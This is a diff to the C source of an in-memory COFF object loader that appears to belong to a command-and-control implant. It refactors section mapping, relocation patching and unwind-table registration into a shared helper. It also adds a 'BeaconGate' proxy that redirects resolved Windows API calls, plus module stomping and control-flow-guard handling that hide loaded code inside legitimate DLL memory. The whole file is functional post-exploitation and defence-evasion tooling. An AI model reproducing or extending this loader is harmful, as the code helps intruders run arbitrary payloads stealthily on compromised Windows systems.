@@ -12,6 +12,9 @@
 #include "Common.h"
 #include "Bof.h"
 
+/* ---- pull in Api.c and Stomp.c as part of this translation unit ----
+ * Define unity-build guard so their Macros.h/Instance.h guards are skipped
+ * (they're already in scope from the includes above). */
 #define _NAX_BOF_UNITY_BUILD_
 #include "Api.c"
 #include "Stomp.c"
@@ -26,6 +29,8 @@ static PCHAR SymName( PCOF_SYMBOL sym, PCHAR strtab ) {
     return sym->cName;
 }
 
+/* NaxHashStrMod: FNV1a-32 of 'len' bytes from str, lowercased, then ".dll" appended.
+ * Used to match BOF Win32 symbol module names (e.g. "KERNEL32") against the PEB. */
 static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
     UINT32 h = 0x811C9DC5u;
     for ( UINT32 i = 0; i < len; i++ ) {
@@ -44,6 +49,8 @@ static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
 
 /* ========= [ Beacon API table ] ========= */
 
+/* Macro forces separate runtime lea/mov per entry - never uses compound literal
+ * struct init which the compiler may lay out in .data with link-time addresses. */
 #define _API(i, h, fn) do { tbl[(i)].Hash = (h); tbl[(i)].Proc = (PVOID)(fn); } while(0)
 
 static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
@@ -76,15 +83,30 @@ static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
     _API( 24, H_BOF_GETPROCADDRESS,       Nax->Kernel32.GetProcAddress   );
     _API( 25, H_BOF_GETMODULEHANDLEA,     Nax->Kernel32.GetModuleHandleA );
     _API( 26, H_BOF_FREELIBRARY,          Nax->Kernel32.FreeLibrary      );
+    /* async BOF APIs */
     _API( 27, H_BOF_BEACONWAKEUP,          BeaconWakeup          );
     _API( 28, H_BOF_BEACONGETSTOPJOBEVENT,  BeaconGetStopJobEvent );
+    /* KV store + heap redirect */
     _API( 29, H_BOF_BEACONADDVALUE,        BeaconAddValue        );
     _API( 30, H_BOF_BEACONGETVALUE,        BeaconGetValue        );
     _API( 31, H_BOF_BEACONREMOVEVALUE,     BeaconRemoveValue     );
-    /* heap isolation: BOF intAlloc/intFree use private heap, not process heap */
-    _API( 32, H_BOF_GETPROCESSHEAP,        BofGetProcessHeap     );
+    _API( 32, H_BOF_BEACONGETPROCESSHEAP,  BofGetProcessHeap     );
 }
 #undef _API
+
+/* ========= [ BeaconGate BOF proxy ] ========= */
+
+static PVOID NaxBofGateProxy( PNAX_INSTANCE Nax, PVOID proc ) {
+    if ( !Nax->Gate || !proc ) return proc;
+    for ( UINT32 i = 0; i < Nax->GateSwaps.Count; i++ ) {
+        if ( proc == Nax->GateSwaps.Entries[i].Original ) {
+            PVOID gate = *Nax->GateSwaps.Entries[i].Slot;
+            NaxDbg( Nax, "[bof] gate proxy: real=%p -> gate=%p", proc, gate );
+            return gate;
+        }
+    }
+    return proc;
+}
 
 /* ========= [ external symbol resolution ] ========= */
 
@@ -103,7 +125,11 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
     UINT32 mod_len = 0;
     while ( sym_name[ mod_len ] && sym_name[ mod_len ] != '$' ) mod_len++;
     if ( sym_name[ mod_len ] != '$' ) {
+        /* Bare Win32 symbol (no MODULE$ prefix) - try kernel32 via GetProcAddress.
+         * Handles __imp_* symbols from <windows.h> declarations that aren't in the
+         * beacon API table (e.g. HeapAlloc, VirtualAlloc, etc.). */
         PVOID proc = Nax->Kernel32.GetProcAddress( Nax->Kernel32.Handle, sym_name );
+        proc = NaxBofGateProxy( Nax, proc );
         NaxDbg( Nax, "[bof] sym '%s' -> bare k32 fallback %p", sym_name, proc );
         return proc;
     }
@@ -113,6 +139,7 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
 
     PVOID hMod = NaxGetModule( mod_hash );
     if ( !hMod ) {
+        /* Build lowercase CHAR module name for LoadLibraryA */
         CHAR mod_buf[64];
         UINT32 i;
         for ( i = 0; i < mod_len && i < 59; i++ ) {
@@ -131,15 +158,28 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
         return NULL;
     }
 
+    /* GetProcAddress handles forwarded exports (e.g. ole32!CreateStreamOnHGlobal →
+     * combase) that NaxGetProc misses when the target module isn't pre-loaded.
+     * BOF symbol names are available as strings so no hash lookup is needed. */
     PVOID proc = Nax->Kernel32.GetProcAddress( hMod, func_name );
+    proc = NaxBofGateProxy( Nax, proc );
     NaxDbg( Nax, "[bof] sym '%s' -> %p (mod=%p)", sym_name, proc, hMod );
     return proc;
 }
 
 /* ========= [ section allocation ] ========= */
 
+/* NON-STOMP: MEM_TOP_DOWN places all sections near the DLLs at 0x7FF9... so
+ * that REL32 displacements stay within ±2 GB.  STOMP: NaxBofStompAlloc uses
+ * StompAllocNear to place non-.text sections + mapFunctions adjacent to the
+ * DLL image (also within ±2 GB).
+ * image_base = MINIMUM section address so all ADDR32NB RVAs are non-negative. */
 #define BOF_ALLOC_FLAGS (MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN)
 
+/* Allocate mapFunctions AFTER sections so all allocations land in the same
+ * memory region.  Allocating it first (with MEM_TOP_DOWN) places it at
+ * 0x7FF8... while sections land at 0x1ECEC... - 6TB apart, 32-bit REL32
+ * overflows.  Allocating last keeps everything within ~400KB of each other. */
 static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
                                  PCOF_HEADER hdr, PCOF_SECTION sections,
                                  PVOID* mapSections, PVOID* mf_out,
@@ -156,9 +196,12 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
     for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
         PCOF_SECTION s = sections + i;
 
+        /* Use VirtualSize for sections with no raw data (.bss = zero-init globals).
+         * Without this, .bss is NULL and BOF globals that should be 0 at entry
+         * are at garbage/NULL addresses → corrupted counters, crashes. */
         UINT32 raw_size  = s->SizeOfRawData;
         UINT32 virt_size = s->VirtualSize;
-        UINT32 need      = ( virt_size > raw_size ) ? virt_size : raw_size;
+        UINT32 need      = ( raw_size > 0 ) ? raw_size : virt_size;
 
         if ( need == 0 ) {
             mapSections[i] = NULL;
@@ -186,10 +229,18 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
         }
 
         mapSections[i] = base;
+
+        /* Copy raw bytes for ALL sections that have them, including writable (.data).
+         * NtAllocateVirtualMemory zero-initialises; for .bss-style sections
+         * (raw=0, virt>0) there is nothing to copy and they stay zeroed.
+         * Do NOT skip writable sections: initialized globals belong in .data and
+         * zeroing them corrupts the BOF's startup state. */
         if ( s->PointerToRawData && raw_size )
             MmCopy( base, bof + s->PointerToRawData, raw_size );
     }
 
+    /* Allocate mapFunctions AFTER all sections so it lands in the same
+     * memory region (within ~400 KB of .text, safe for 32-bit REL32). */
     PVOID  mf  = NULL;
     SIZE_T mfs = 4096;
     Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
@@ -219,6 +270,10 @@ static VOID NaxBofCleanupSections( PNAX_INSTANCE Nax, PVOID* mapSections,
 }
 
 /* ========= [ relocation processing ] ========= */
+
+/* mapFunctions: MEM_TOP_DOWN buffer for external-symbol IAT slots.
+ * External REL32 calls (FF 15, __imp__*) patch the displacement to point here.
+ * *mf_idx tracks the next free 8-byte slot. */
 static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                                      PCOF_HEADER hdr, PCOF_SECTION sections,
                                      PCOF_SYMBOL symtab, PCHAR strtab,
@@ -249,6 +304,7 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
             } else {
                 PCHAR name = SymName( sym, strtab );
 
+                /* Skip __imp_ prefix (6 bytes) */
                 if ( name[0] == '_' && name[1] == '_' &&
                      name[2] == 'i' && name[3] == 'm' &&
                      name[4] == 'p' && name[5] == '_' )
@@ -263,12 +319,19 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                 }
             }
 
+            /* Apply relocation patch */
             switch ( r->Type ) {
 #if defined(__x86_64__) || defined(_WIN64)
             case IMAGE_REL_AMD64_ADDR64:
                 *((UINT64*)loc) += (UINT64)(ULONG_PTR)sym_addr;
                 break;
             case IMAGE_REL_AMD64_ADDR32NB: {
+                /* RVA relative to image_base (the lowest allocated section address).
+                 * Using the minimum address ensures all RVAs are non-negative UINT32.
+                 * With MEM_TOP_DOWN, .text is at the HIGHEST address; using mapSections[0]
+                 * instead would produce negative values for all sections below .text,
+                 * which corrupts .pdata RUNTIME_FUNCTION UnwindInfoAddress entries and
+                 * makes exception dispatch crash rather than unwind correctly. */
                 INT32 cur;
                 MmCopy( &cur, loc, 4 );
                 cur += (INT32)( (ULONG_PTR)sym_addr - image_base );
@@ -283,6 +346,10 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
             case IMAGE_REL_AMD64_REL32_5: {
                 UINT32 delta  = r->Type - IMAGE_REL_AMD64_REL32;
                 INT32  addend = 0;
+                /* COFF spec: the 4 bytes at the relocation site are a signed addend.
+                 * Both COFFLoader and Kharon include it in the displacement formula.
+                 * Omitting it produces wrong addresses for any non-zero addend
+                 * (e.g. RIP-relative access to the middle of a static array). */
                 MmCopy( &addend, loc, 4 );
 
                 PVOID target;
@@ -290,6 +357,10 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                 if ( sym->SectionNumber > 0 || !mapFunctions ) {
                     target = sym_addr;
                 } else {
+                    /* External symbol via __imp_* (DECLSPEC_IMPORT, FF15 indirect call).
+                     * Store the 64-bit function VA in the next mapFunctions slot.
+                     * The disp32 points to that slot - one extra indirection, but the
+                     * slot is in the same TOP_DOWN range so the ±2 GB limit is safe. */
                     if ( *mf_idx < 512 ) {
                         mapFunctions[ *mf_idx ] = (UINT64)(ULONG_PTR)sym_addr;
                         target = (PVOID)( mapFunctions + *mf_idx );
@@ -351,144 +422,136 @@ static PVOID NaxBofFindEntry( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL sy
     return NULL;
 }
 
+/* ========= [ shared COFF preparation ] ========= */
+
+typedef struct {
+    PCOF_HEADER       Hdr;
+    PCOF_SECTION      Sections;
+    PCOF_SYMBOL       Symtab;
+    PCHAR             Strtab;
+    PVOID             MapSections[ BOF_MAX_SECTIONS ];
+    PVOID             MfBase;
+    BOOL              Stomped;
+    ULONG_PTR         ImageBase;
+    PRUNTIME_FUNCTION PdataTable;
+    DWORD             PdataCount;
+    BOOL              PdataInDll;
+} NAX_BOF_PREP;
+
+static INT NaxBofPrepare( PNAX_INSTANCE Nax, PBYTE bof, UINT32 bof_size, NAX_BOF_PREP* p ) {
+    if ( bof_size < sizeof( COF_HEADER ) ) return NAX_ERR_WIRE;
+
+    p->Hdr      = (PCOF_HEADER)bof;
+    p->Sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
+    p->Symtab   = (PCOF_SYMBOL)( bof + p->Hdr->PointerToSymbolTable );
+    p->Strtab   = (PCHAR)( p->Symtab + p->Hdr->NumberOfSymbols );
+
+    if ( p->Hdr->Machine != COF_MACHINE_AMD64 ) return NAX_ERR_INVAL;
+
+    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
+    NaxBofInitApiTable( bofApiTable, Nax );
+
+    MmZero( p->MapSections, sizeof( p->MapSections ) );
+    p->MfBase     = NULL;
+    p->Stomped    = FALSE;
+    p->PdataTable = NULL;
+    p->PdataCount = 0;
+    p->PdataInDll = FALSE;
+
+    UINT32 mf_idx = 0;
+
+    if ( NaxBofAllocSections( Nax, bof, p->Hdr, p->Sections, p->MapSections, &p->MfBase, &p->Stomped ) != NAX_OK )
+        return NAX_ERR_FAIL;
+
+    p->ImageBase = (ULONG_PTR)~0ULL;
+    for ( UINT16 i = 0; i < p->Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
+        if ( p->MapSections[i] && (ULONG_PTR)p->MapSections[i] < p->ImageBase )
+            p->ImageBase = (ULONG_PTR)p->MapSections[i];
+    }
+    if ( p->MfBase && (ULONG_PTR)p->MfBase < p->ImageBase )
+        p->ImageBase = (ULONG_PTR)p->MfBase;
+
+    if ( NaxBofProcessRelocations( Nax, bof, p->Hdr, p->Sections, p->Symtab, p->Strtab, p->MapSections, bofApiTable, (PUINT64)p->MfBase, &mf_idx, p->ImageBase ) != NAX_OK ) {
+        NaxBofCleanupSections( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Stomped );
+        if ( p->MfBase ) { SIZE_T z = 0; PVOID b = p->MfBase; Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE ); }
+        return NAX_ERR_FAIL;
+    }
+
+    if ( p->Stomped ) {
+        for ( UINT16 pi = 0; pi < p->Hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
+            PCOF_SECTION ps = p->Sections + pi;
+            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
+                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
+                 p->MapSections[pi] && ps->SizeOfRawData >= 12 ) {
+                p->PdataTable = (PRUNTIME_FUNCTION)p->MapSections[pi];
+                p->PdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
+                PVOID xdataBase = NULL;
+                ULONG xdataSize = 0;
+                ULONG_PTR firstUnwindVA = p->ImageBase + p->PdataTable[0].UnwindData;
+                for ( UINT16 xi = 0; xi < p->Hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
+                    if ( !p->MapSections[xi] ) continue;
+                    UINT32 secSz = p->Sections[xi].SizeOfRawData;
+                    if ( secSz == 0 ) secSz = p->Sections[xi].VirtualSize;
+                    if ( firstUnwindVA >= (ULONG_PTR)p->MapSections[xi] &&
+                         firstUnwindVA <  (ULONG_PTR)p->MapSections[xi] + secSz ) {
+                        xdataBase = p->MapSections[xi];
+                        xdataSize = secSz;
+                        break;
+                    }
+                }
+                p->PdataInDll = NaxBofStompPdata( Nax, p->PdataTable, p->PdataCount, p->ImageBase, xdataBase, xdataSize );
+                if ( !p->PdataInDll )
+                    Nax->Ntdll.RtlAddFunctionTable( p->PdataTable, p->PdataCount, (DWORD64)p->ImageBase );
+                break;
+            }
+        }
+        NaxBofStompProtect( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Sections );
+    } else {
+        for ( UINT16 i = 0; i < p->Hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
+            if ( !p->MapSections[i] ) continue;
+            PVOID  base = p->MapSections[i];
+            SIZE_T sz   = (SIZE_T)( p->Sections[i].SizeOfRawData + 16 );
+            ULONG  old  = 0;
+            Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old );
+        }
+    }
+
+    return NAX_OK;
+}
+
+static VOID NaxBofPrepCleanup( PNAX_INSTANCE Nax, NAX_BOF_PREP* p ) {
+    if ( p->PdataTable && !p->PdataInDll )
+        Nax->Ntdll.RtlDeleteFunctionTable( p->PdataTable );
+    NaxBofCleanupSections( Nax, p->MapSections, p->Hdr->NumberOfSections, p->Stomped );
+    if ( p->MfBase ) {
+        SIZE_T z = 0; PVOID b = p->MfBase;
+        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &b, &z, MEM_RELEASE );
+    }
+}
+
 /* ========= [ public entry point ] ========= */
 
 FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
                         PBYTE bof, UINT32 bof_size,
                         PBYTE user_args, UINT32 user_args_size ) {
-    if ( bof_size < sizeof( COF_HEADER ) ) return NAX_ERR_WIRE;
 
-    PCOF_HEADER  hdr      = (PCOF_HEADER)bof;
-    PCOF_SECTION sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
-    PCOF_SYMBOL  symtab   = (PCOF_SYMBOL)( bof + hdr->PointerToSymbolTable );
-    PCHAR        strtab   = (PCHAR)( symtab + hdr->NumberOfSymbols );
+    NAX_BOF_PREP prep;
+    INT rc = NaxBofPrepare( Nax, bof, bof_size, &prep );
+    if ( rc != NAX_OK ) return rc;
 
-    NaxDbg( Nax, "[bof] execute: %u bytes machine=0x%04x sections=%u symbols=%u",
-            bof_size, (UINT32)hdr->Machine, (UINT32)hdr->NumberOfSections, (UINT32)hdr->NumberOfSymbols );
-
-    if ( hdr->Machine != COF_MACHINE_AMD64 ) {
-        NaxDbg( Nax, "[bof] wrong machine type 0x%04x (expected 0x8664)", (UINT32)hdr->Machine );
-        return NAX_ERR_INVAL;
-    }
-
-    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
-    NaxBofInitApiTable( bofApiTable, Nax );
-
-    PVOID mapSections[ BOF_MAX_SECTIONS ];
-    MmZero( mapSections, sizeof( mapSections ) );
-
-    PVOID  mf_base = NULL;
-    UINT32 mf_idx  = 0;
-    BOOL   stomped = FALSE;
-
-    /* ---- 1. allocate sections + mapFunctions (all via AllocSections) ---- */
-    NaxDbg( Nax, "[bof] step 1: alloc sections" );
-    if ( NaxBofAllocSections( Nax, bof, hdr, sections, mapSections, &mf_base, &stomped ) != NAX_OK ) {
-        NaxDbg( Nax, "[bof] alloc FAILED" );
-        BeaconOutput( CALLBACK_ERROR, "alloc", 5 );
-        return NAX_ERR_FAIL;
-    }
-    NaxDbg( Nax, "[bof] step 1: alloc OK (stomped=%d)", (INT)stomped );
-
-    ULONG_PTR image_base = (ULONG_PTR)~0ULL;
-    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
-        if ( mapSections[i] && (ULONG_PTR)mapSections[i] < image_base )
-            image_base = (ULONG_PTR)mapSections[i];
-    }
-    if ( mf_base && (ULONG_PTR)mf_base < image_base )
-        image_base = (ULONG_PTR)mf_base;
-    NaxDbg( Nax, "[bof] image_base=%p (.text offset from base=0x%llx)",
-            (PVOID)image_base, (unsigned long long)( (ULONG_PTR)mapSections[0] - image_base ) );
-
-    /* ---- 2. process relocations ---- */
-    NaxDbg( Nax, "[bof] step 2: process relocations" );
-    if ( NaxBofProcessRelocations( Nax, bof, hdr, sections,
-                                   symtab, strtab, mapSections, bofApiTable,
-                                   (PUINT64)mf_base, &mf_idx, image_base ) != NAX_OK ) {
-        NaxDbg( Nax, "[bof] reloc FAILED" );
-        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
-        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
-        return NAX_ERR_FAIL;
-    }
-    NaxDbg( Nax, "[bof] reloc OK (mapFunctions used=%u slots)", mf_idx );
-
-    /* ---- 3. register BOF .pdata for clean stack unwinding (stomp) ---- */
-    PRUNTIME_FUNCTION pdataTable = NULL;
-    DWORD pdataCount = 0;
-    BOOL  pdataInDll = FALSE;
-    if ( stomped ) {
-        for ( UINT16 pi = 0; pi < hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
-            PCOF_SECTION ps = sections + pi;
-            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
-                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
-                 mapSections[pi] && ps->SizeOfRawData >= 12 ) {
-                pdataTable = (PRUNTIME_FUNCTION)mapSections[pi];
-                pdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
-
-                PVOID xdataBase = NULL;
-                ULONG xdataSize = 0;
-                ULONG_PTR firstUnwindVA = image_base + pdataTable[0].UnwindData;
-                for ( UINT16 xi = 0; xi < hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
-                    if ( !mapSections[xi] ) continue;
-                    UINT32 secSz = sections[xi].SizeOfRawData;
-                    if ( secSz == 0 ) secSz = sections[xi].VirtualSize;
-                    if ( firstUnwindVA >= (ULONG_PTR)mapSections[xi] &&
-                         firstUnwindVA <  (ULONG_PTR)mapSections[xi] + secSz ) {
-                        xdataBase = mapSections[xi];
-                        xdataSize = secSz;
-                        break;
-                    }
-                }
-
-                pdataInDll = NaxBofStompPdata( Nax, pdataTable, pdataCount, image_base,
-                                                xdataBase, xdataSize );
-                if ( !pdataInDll )
-                    Nax->Ntdll.RtlAddFunctionTable( pdataTable, pdataCount, (DWORD64)image_base );
-                NaxDbg( Nax, "[bof] .pdata %s: %u entries base=%p xdata=%p(%u)",
-                        pdataInDll ? "injected into DLL" : "registered dynamic",
-                        pdataCount, (PVOID)image_base, xdataBase, xdataSize );
-                break;
-            }
-        }
-    }
-
-    /* ---- 3b. set final memory protections ---- */
-    if ( stomped ) {
-        NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
-        NaxDbg( Nax, "[bof] step 3b: stomp protections OK (.text=RX, rest=RW)" );
-    } else {
-        NaxDbg( Nax, "[bof] step 3b: set PAGE_EXECUTE_READWRITE on all sections" );
-        for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
-            if ( !mapSections[i] ) continue;
-            PVOID    base = mapSections[i];
-            SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
-            ULONG    old  = 0;
-            NTSTATUS st   = Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz, PAGE_EXECUTE_READWRITE, &old );
-            NaxDbg( Nax, "[bof] sec[%d] '%.8s' RWX st=0x%x", (INT)i, sections[i].Name, (UINT32)st );
-        }
-        NaxDbg( Nax, "[bof] step 3b: protections OK" );
-    }
-
-    /* ---- 4. find entry point ---- */
-    NaxDbg( Nax, "[bof] step 4: find 'go'" );
-    PVOID entry = NaxBofFindEntry( Nax, hdr, symtab, strtab, mapSections );
+    PVOID entry = NaxBofFindEntry( Nax, prep.Hdr, prep.Symtab, prep.Strtab, prep.MapSections );
     if ( !entry ) {
-        NaxDbg( Nax, "[bof] entry FAILED" );
-        if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
-        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
-        if ( mf_base ) { SIZE_T _z=0; PVOID _b=mf_base; Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &_b, &_z, MEM_RELEASE ); }
+        NaxBofPrepCleanup( Nax, &prep );
         BeaconOutput( CALLBACK_ERROR, "go", 2 );
         return NAX_ERR_FAIL;
     }
-    NaxDbg( Nax, "[bof] entry OK: %p", entry );
 
     NAX_JOB* curJob = NaxFindCurrentJob( Nax );
     NAX_BOF_CTX* stompCtx = curJob ? &curJob->BofCtx : &Nax->BofCtx;
-    stompCtx->Stomped   = stomped ? 0x01 : 0x00;
-    stompCtx->StompSlot = stomped ? ( curJob ? curJob->StompSlotIdx : 0xFF ) : 0x00;
+    stompCtx->Stomped   = prep.Stomped ? 0x01 : 0x00;
+    stompCtx->StompSlot = prep.Stomped ? ( curJob ? curJob->StompSlotIdx : 0xFF ) : 0x00;
 
-    /* ---- 5. execute BOF ---- */
-    if ( stomped && Nax->CfgEnabled ) {
+    if ( prep.Stomped && Nax->CfgEnabled ) {
         BOF_STOMP_SLOT* cfgSlot = NULL;
         if ( Nax->BofStompPool.SmStompReq )
             cfgSlot = &Nax->BofStompPool.SmSlot;
@@ -500,20 +563,10 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
             NaxCfgAddTarget( Nax, cfgSlot->DllBase, entry );
     }
 
-    NaxDbg( Nax, "[bof] calling go(%p, %u)", user_args, user_args_size );
     void ( *go )( char*, unsigned long ) = (void(*)( char*, unsigned long ))entry;
     go( (char*)user_args, (unsigned long)user_args_size );
-    NaxDbg( Nax, "[bof] go returned, output=%u bytes", Nax->BofCtx.Len );
 
-    if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
-
-    /* ---- 6. cleanup ---- */
-    NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
-    if ( mf_base ) {
-        SIZE_T _z = 0; PVOID _b = mf_base;
-        Nax->Ntdll.NtFreeVirtualMemory( NtCurrentProcess(), &_b, &_z, MEM_RELEASE );
-    }
-    NaxDbg( Nax, "[bof] done" );
+    NaxBofPrepCleanup( Nax, &prep );
     return NAX_OK;
 }
 
@@ -551,124 +604,36 @@ static PVOID NaxBofFindSymbol( PNAX_INSTANCE Nax, PCOF_HEADER hdr, PCOF_SYMBOL s
 FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
                                PBYTE bof, UINT32 bof_size,
                                PCHAR sym_name ) {
-    if ( bof_size < sizeof( COF_HEADER ) ) return NULL;
-
     NaxBofFreeResident( Nax );
-
-    PCOF_HEADER  hdr      = (PCOF_HEADER)bof;
-    PCOF_SECTION sections = (PCOF_SECTION)( bof + sizeof( COF_HEADER ) );
-    PCOF_SYMBOL  symtab   = (PCOF_SYMBOL)( bof + hdr->PointerToSymbolTable );
-    PCHAR        strtab   = (PCHAR)( symtab + hdr->NumberOfSymbols );
-
-    NaxDbg( Nax, "[bof-resident] load: %u bytes sections=%u symbols=%u",
-            bof_size, (UINT32)hdr->NumberOfSections, (UINT32)hdr->NumberOfSymbols );
-
-    if ( hdr->Machine != COF_MACHINE_AMD64 ) return NULL;
-
-    NAX_BOF_API bofApiTable[ NAX_BOF_API_COUNT ];
-    NaxBofInitApiTable( bofApiTable, Nax );
-
-    PVOID mapSections[ BOF_MAX_SECTIONS ];
-    MmZero( mapSections, sizeof( mapSections ) );
-
-    PVOID  mf_base = NULL;
-    UINT32 mf_idx  = 0;
-    BOOL   stomped = FALSE;
 
     Nax->BofStompPool.SmStompReq = TRUE;
 
-    if ( NaxBofAllocSections( Nax, bof, hdr, sections, mapSections, &mf_base, &stomped ) != NAX_OK ) {
-        NaxDbg( Nax, "[bof-resident] alloc FAILED" );
+    NAX_BOF_PREP prep;
+    INT rc = NaxBofPrepare( Nax, bof, bof_size, &prep );
+    if ( rc != NAX_OK ) {
         Nax->BofStompPool.SmStompReq = FALSE;
         return NULL;
     }
 
-    ULONG_PTR image_base = (ULONG_PTR)~0ULL;
-    for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
-        if ( mapSections[i] && (ULONG_PTR)mapSections[i] < image_base )
-            image_base = (ULONG_PTR)mapSections[i];
-    }
-    if ( mf_base && (ULONG_PTR)mf_base < image_base )
-        image_base = (ULONG_PTR)mf_base;
-
-    if ( NaxBofProcessRelocations( Nax, bof, hdr, sections,
-                                   symtab, strtab, mapSections, bofApiTable,
-                                   (PUINT64)mf_base, &mf_idx, image_base ) != NAX_OK ) {
-        NaxBofCleanupSections( Nax, mapSections, hdr->NumberOfSections, stomped );
-        if ( mf_base ) { SIZE_T z=0; PVOID b=mf_base; Nax->Ntdll.NtFreeVirtualMemory(NtCurrentProcess(),&b,&z,MEM_RELEASE); }
-        Nax->BofStompPool.SmStompReq = FALSE;
-        return NULL;
-    }
-
-    PRUNTIME_FUNCTION pdataTable = NULL;
-    DWORD pdataCount = 0;
-    BOOL  pdataInDll = FALSE;
-    if ( stomped ) {
-        for ( UINT16 pi = 0; pi < hdr->NumberOfSections && pi < BOF_MAX_SECTIONS; pi++ ) {
-            PCOF_SECTION ps = sections + pi;
-            if ( ps->Name[0] == '.' && ps->Name[1] == 'p' && ps->Name[2] == 'd' &&
-                 ps->Name[3] == 'a' && ps->Name[4] == 't' && ps->Name[5] == 'a' &&
-                 mapSections[pi] && ps->SizeOfRawData >= 12 ) {
-                pdataTable = (PRUNTIME_FUNCTION)mapSections[pi];
-                pdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
-                PVOID xdataBase = NULL;
-                ULONG xdataSize = 0;
-                ULONG_PTR firstUnwindVA = image_base + pdataTable[0].UnwindData;
-                for ( UINT16 xi = 0; xi < hdr->NumberOfSections && xi < BOF_MAX_SECTIONS; xi++ ) {
-                    if ( !mapSections[xi] ) continue;
-                    UINT32 secSz = sections[xi].SizeOfRawData;
-                    if ( secSz == 0 ) secSz = sections[xi].VirtualSize;
-                    if ( firstUnwindVA >= (ULONG_PTR)mapSections[xi] &&
-                         firstUnwindVA <  (ULONG_PTR)mapSections[xi] + secSz ) {
-                        xdataBase = mapSections[xi];
-                        xdataSize = secSz;
-                        break;
-                    }
-                }
-                pdataInDll = NaxBofStompPdata( Nax, pdataTable, pdataCount, image_base,
-                                                xdataBase, xdataSize );
-                if ( !pdataInDll )
-                    Nax->Ntdll.RtlAddFunctionTable( pdataTable, pdataCount, (DWORD64)image_base );
-                break;
-            }
-        }
-    }
-
-    if ( stomped ) {
-        NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
-    } else {
-        for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
-            if ( !mapSections[i] ) continue;
-            PVOID    base = mapSections[i];
-            SIZE_T   sz   = (SIZE_T)( sections[i].SizeOfRawData + 16 );
-            ULONG    old  = 0;
-            Nax->Ntdll.NtProtectVirtualMemory( NtCurrentProcess(), &base, &sz,
-                                                PAGE_EXECUTE_READWRITE, &old );
-        }
-    }
-
-    PVOID entry = NaxBofFindSymbol( Nax, hdr, symtab, strtab, mapSections, sym_name );
+    PVOID entry = NaxBofFindSymbol( Nax, prep.Hdr, prep.Symtab, prep.Strtab, prep.MapSections, sym_name );
